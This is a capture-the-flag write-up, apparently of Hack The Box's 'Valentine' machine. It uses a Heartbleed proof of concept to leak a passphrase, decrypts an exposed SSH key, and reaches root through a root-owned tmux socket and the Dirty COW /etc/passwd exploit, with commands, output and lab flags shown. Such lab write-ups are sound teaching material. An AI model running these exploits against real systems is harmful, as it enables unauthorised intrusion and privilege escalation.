### Summary
We begin this box enumerating a `TLS` web application. It strongly implies vulnerability to `heartbleed`, so we attempt the exploit and we succeed, leaking a `base64` encoded string that will later be used to decrypt an `rsa` key discovered through subdomain brute-forcing. With this decrypted key, we log in to the box via `ssh` as the user `hype` in which we see through `bash` history and active processes, a `tmux` instance being run with the `-S` socket parameter. We can piggyback on this `tmux` instance to gain root access. We could also use the `DirtyCOW` kernel race condition exploit due to this box's kernel reaching EoL before 2018.

### Tools
- `feroxbuster`
- `openssl`

###### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80/443]]
	- [[#Heartbleed]]
	- [[#Subdirectory Brute-force]]
###### [[#User Shell - hype]]
- [[#SSH - TCP 22]]
	- [[#Docker Container]]
###### [[#Root Shell]]
- [[#tmux -S]]
- [[#Dirty Cow]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.48.122 -oN nmap/tcp            
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

❯ sudo nmap -p 22,80,443 -sCV -vv 10.129.48.122 -oN nmap/tcpScripts
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi+474hX6LHkDgC9dzcvEGyMB/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/ROm82p0JasEdg1z6QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA5vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8CPRkwyPdi/hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5QREuRbGFM6DATJJFkg+PXG/OsLsba/BP8UfcuPM+WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoRfGqzi+3ndUCo9/m+T18pn+ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaMcYOsFqO841K0O90BV8DhyU4JYBjcpslT+A2X+ahj2QJVGqZJSlusNAQ9vplWxofFONa+IUSGl1UsGjY0QGsA5l5ohfQ==
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up+q0NriI5g5xAs1+0gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR8sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo+KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPPM7929EoovpooSjwPfqvEhRMtq+KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic+Y0KWKa9qdeBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZUADy8A6tbfSgopaeR2UN4QRgM1dX
|   256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+pCNI5Xv8P96CmyDi/EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl+LEiKQee5RRw9d+lgH3Fm5O9XI=
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn\'t have a title (text/html).
|_http-server-header: Apache/2.2.22 (Ubuntu)
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_ssl-date: 2025-12-29T07:39:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Issuer: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2018-02-06T00:45:25
| Not valid after:  2019-02-06T00:45:25
| MD5:   a413 c4f0 b145 2154 fb54 b2de c7a9 809d
| SHA-1: 2303 80da 60e7 bde7 2ba6 76dd 5214 3c3c 6f53 01b1
| -----BEGIN CERTIFICATE-----
| MIIDZzCCAk+gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV
| BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG
| A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1
| MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50
| aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB
| BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo/znkcGfT7SPrTLzNrb8ic+aO/GWao
| oY35ImIO4Z5FUB9ZL6y6lc+vI6pUyWRADyWoxd3LxByHDNJzEi53ds+JSPs5SuH1
| PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx+39vsFiK6ywcrepvvFZndGKXVg
| 0K+R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6
| 4DFNQybOsJHm0JtI2M9PefmvEkTUZeT/d0dWhU076a3bTestKZf4WpqZw60XGmxz
| pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O
| BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy
| fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7
| cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU+N
| XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc+x+91GWYNQvvdnFLO
| 5CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S
| q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP
| csAwIHShdX+Jd8E5oty5C07FJrzVtW+Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa
| gRSFfyZx/VqBh9c=
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.2.22 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 0s
```
```sh
❯ sudo nmap -p- -sU --min-rate 10000 -vv 10.129.48.122 -oN nmap/udp            
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 254

❯ sudo nmap -p 5353 -sU -sCV -vv 10.129.48.122 -oN nmap/udpScripts
PORT     STATE SERVICE REASON               VERSION
5353/udp open  mdns    udp-response ttl 254 DNS-based service discovery
| dns-service-discovery: 
|   9/tcp workstation
|     Address=10.129.48.122 dead:beef::ac40:cdbf:4e8f:2c20
|   22/tcp udisks-ssh
|_    Address=10.129.48.122 dead:beef::ac40:cdbf:4e8f:2c20
```
- Judging by the `OpenSSH 5.9p1` and `Apache httpd 2.2.22` it looks like we're working with a very old linux distribution, [precise](https://launchpad.net/ubuntu/+source/openssh/1:5.9p1-5ubuntu1.9)
- The [Ubuntu releases wiki](https://documentation.ubuntu.com/project/release-team/list-of-releases/) shows that precise pangolin reached EOL `4/28/2017`

## Web - TCP 80/443
---
- Navigating to the web page shows a bare minimum HTML site with `omg.jpg`
![[Pasted image 20251229025237.png]]
- This is the logo for `heartbleed`

### Heartbleed
- Heartbleed is essentially a buffer overflow attack that allows an attacker to leak information beyond the bounds of the buffer in which the information was supposed to be returned, allowing one to leak additional areas of memory
- We can grab a heartbleed POC using `searchsploit`:
```sh
❯ searchsploit -m 32745                                                          
  Exploit: OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure     
      URL: https://www.exploit-db.com/exploits/32745                             
     Path: /opt/exploitdb/exploits/multiple/remote/32745.py                      
    Codes: CVE-2014-0346, OSVDB-105465, CVE-2014-0160                            
 Verified: True                                                                  
File Type: Python script, ASCII text executable                                  
Copied to: /home/aldamd/ctf/htb/Valentine - 10.129.48.122/32745.py               
```
- We have to update it from `python2` but afterwards, running against our target machine indicates that it's vulnerable!
```sh
❯ ./32745_python3.py 10.129.48.122 > heartbleedOutput.txt
❯ cat heartbleedOutput.txt | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....\".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D F2  mV0aGVoeXBlCg==.
  0160: CA 0A 1F 26 4E 4A 29 1A 66 25 0D 1D 95 F2 6C 9D  ...&NJ).f%....l.
  0170: 53 A1 74 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  S.t.............
```
- The item of interest here is the `base64` encoded string variable `$text`
	- `aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==`
	- decodes to `heartbleedbelievethehype`

### Subdirectory Brute-force
- We can enumerate subdirectories with `feroxbuster`:
```sh
❯ feroxbuster -u "https://10.129.48.122" -x php,txt -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/directory-list-2.3-medium.txt --insecure  

200      GET        1l        2w       38c https://10.129.48.122/
200      GET      620l     3539w   275344c https://10.129.48.122/omg.jpg
200      GET        1l        2w       38c https://10.129.48.122/index
200      GET        1l        2w       38c https://10.129.48.122/index.php
301      GET        9l       28w      314c https://10.129.48.122/dev
200      GET        2l     1794w     5383c https://10.129.48.122/dev/hype_key
200      GET        8l       39w      227c https://10.129.48.122/dev/notes.txt
200      GET       25l       54w      552c https://10.129.48.122/decode.php
200      GET       27l       54w      554c https://10.129.48.122/encode
200      GET       27l       54w      554c https://10.129.48.122/encode.php
200      GET       25l       54w      552c https://10.129.48.122/decode
200      GET      620l     3539w   275344c https://10.129.48.122/omg
```

- `/dev/notes` is the following:
```text
To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don't use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
```

- `/dev/hype_key` is the following:
```text
2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d
```
- We can decode the hex either with `cyberchef` or with `xxd` in reverse mode:
```sh
❯ cat hype_key | xxd -r -p
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----

❯ cat hype_key | xxd -r -p > hype_key_enc
```

- We can try to decrypt the key with `openssl`:
```sh
❯ openssl rsa -in hype_key_enc -out hype_key_dec
Enter pass phrase for hype_key_enc:
```
- We can pass it the string we uncovered with heartbleed: `heartbleedbelievethehype` and it works!

# User Shell - hype
## SSH - TCP 22
---
- Now that we've got a valid `rsa` key, we can try to use it to log in with `ssh` as user `hype` given the file name. We also have to 'downgrade' our ssh client so that we can connect with the `rsa` private key:
```sh
❯ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i hype_key_decrypted hype@10.129.48.122
```

### Docker Container
```sh
❯ docker pull ubuntu:12.04
❯ docker run -v .:/share -it ubuntu:12.04 /bin/bash

root@afc393c5dd27:/share$ sed -i 's/archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list

root@afc393c5dd27:/share$ sed -i 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list

root@afc393c5dd27:/share$ apt-get update
root@afc393c5dd27:/share$ apt-get install -y openssh-client
root@afc393c5dd27:/share$ ssh -i hype_key_dec hype@10.129.48.122
```

- Now that that's taken care of! Let's grab the user flag:
```sh
hype@Valentine:~$ cat /home/hype/user.txt
22caf4a242566a5bd5f8c60baac190f9
```

# Root Shell
## tmux -S
---
- If we inspect all processes with `ps aux`, we can see that the following is running as user `root`:
```sh
root       /usr/bin/tmux -S /.devs/dev_sess
```
- We're also hinted at this if we inspect `history`:
```sh
hype@Valentine:~$ history
    1  exit
    2  exot
    3  exit
    4  ls -la
    5  cd /
    6  ls -la
    7  cd .devs
    8  ls -la
    9  tmux -L dev_sess 
   10  tmux a -t dev_sess 
   11  tmux --help
   12  tmux -S /.devs/dev_sess 
```

- If we execute:
```sh
hype@Valentine:~$ tmux -S /.devs/dev_sess 
```
- we use the socket stored in this location to gain a root shell!
```sh
root@Valentine:/home/hype# whoami
root
root@Valentine:/home/hype# cat /root/root.txt 
79342722b3be2d7e18ccf579b7b64493
```

## Dirty Cow
---
- We suspected this is an old box, `uname -a` confirms it:
```sh
hype@Valentine:~$ uname -a
Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
- The [Dirty COW Wiki](https://en.wikipedia.org/wiki/Dirty_COW) confirms that this version of the kernel is vulnerable
	- We also know that this is a 2017 EoL kernel, and Dirty COW affects kernels before 2018
- We can use `searchsploit dirty cow` to see some POCs, one that got my interest was a privesc ethod via `/etc/passwd`:
```sh
❯ searchsploit -m 40839     
  Exploit: Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
      URL: https://www.exploit-db.com/exploits/40839
     Path: /opt/exploitdb/exploits/linux/local/40839.c
    Codes: CVE-2016-5195
 Verified: True
File Type: C source, ASCII text
Copied to: /home/aldamd/ctf/htb/Valentine - 10.129.48.122/40839.c
```

- The compilation instructions are in the binary:
```sh
hype@Valentine:~$ vi dirty.c
hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
hype@Valentine:~$ ./dirty 
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: 
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f02c7e8f000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password'.
hype@Valentine:~$ su - firefart
Password: 
firefart@Valentine:~# id
uid=0(firefart) gid=0(root) groups=0(root)
```

